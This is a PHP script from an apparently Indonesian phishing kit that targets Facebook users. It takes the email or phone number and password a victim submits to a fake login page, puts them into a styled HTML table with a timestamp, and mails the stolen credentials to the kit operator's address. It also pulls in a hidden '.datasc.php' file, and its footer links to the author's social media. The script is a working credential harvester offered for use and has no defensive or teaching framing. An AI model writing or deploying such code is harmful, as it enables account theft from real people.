<?php
date_default_timezone_set("Asia/Jakarta");
extract($_POST);

$time = date('d-m-Y : h-i-s');

$subjek = "Result Facebook Punya si { $user }";
$pesan = '
<center>
 <div style="background: url(https://j.top4top.io/p_2224gza4x0.png) no-repeat;border:2px solid pink;background-size: 100% 100%; width: 294; height: 101px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
 <table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid pink; border-collapse:collapse;width:100%;background:#cf0485;">
    <tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Email/Telpon</b></th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$user.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Password</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$pass.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Date/Time</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$time.'</th> 
</tr>
</table>
<div style="border:2px solid pink;width: 294; font-weight:bold; height: 20px; background: #cf0485; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">

<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#0744FF;" href="https://www.facebook.com/lilik.nurwahyuni.1">Facebook</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#FF0107;" href="https://youtu.be/WRVfLF4YmOA">YouTube</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#25D366;" href="https://wa.me/6282183925354">WhatsApp</a>
</div>
 <center>
';

include 'email.php';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
mail($email, $subjek, $pesan, $headers);
include '.datasc.php';



?>